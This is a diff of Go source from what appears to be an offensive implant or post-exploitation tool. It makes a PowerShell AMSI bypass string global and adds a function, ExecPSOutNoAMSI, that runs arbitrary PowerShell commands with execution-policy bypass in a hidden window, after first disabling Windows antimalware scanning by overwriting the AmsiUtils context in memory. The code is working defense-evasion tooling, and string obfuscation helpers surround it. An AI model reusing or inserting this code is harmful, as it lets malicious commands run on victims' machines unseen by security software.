@@ -26,6 +26,8 @@ var (
 	VirtualAlloc     = kernel32.MustFindProc(utils.Bake("§VirtualAlloc§"))
 	RtlCopyMemory    = ntdll.MustFindProc(utils.Bake("§RtlCopyMemory§"))
 	procSetStdHandle = kernel32.MustFindProc(utils.Bake("§SetStdHandle§"))
+
+	amsiBypass = utils.Bake(`§$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)§`)
 )
 
 // SetStdHandle https://docs.microsoft.com/de-de/windows/console/setstdhandle
@@ -49,8 +51,6 @@ func Shell() *exec.Cmd {
 
 // Powershell ...
 func Powershell() (*exec.Cmd, error) {
-	amsiBypass := utils.Bake(`§$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)§`)
-	//fmt.Println(amsiBypass)
 	cmd := exec.Command(utils.Bake("§C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe§"), "-exec", "bypass", "-NoExit", "-command", string(amsiBypass))
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	return cmd, nil
@@ -104,6 +104,16 @@ func ExecPSOut(command string, encoded bool) (string, error) {
 	} else {
 		cmd = exec.Command(path, "-exec", "bypaSs", "-command", command+"\n")
 	}
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	out, err := cmd.CombinedOutput()
+	return string(out), err
+}
+
+
+func ExecPSOutNoAMSI(command string) (string, error) {
+	path := "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+	var cmd *exec.Cmd
+	cmd = exec.Command(path, "-exec", "bypaSs", "-command", amsiBypass + ";" +command+"\n")
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	out, err := cmd.CombinedOutput()
 	return string(out), err
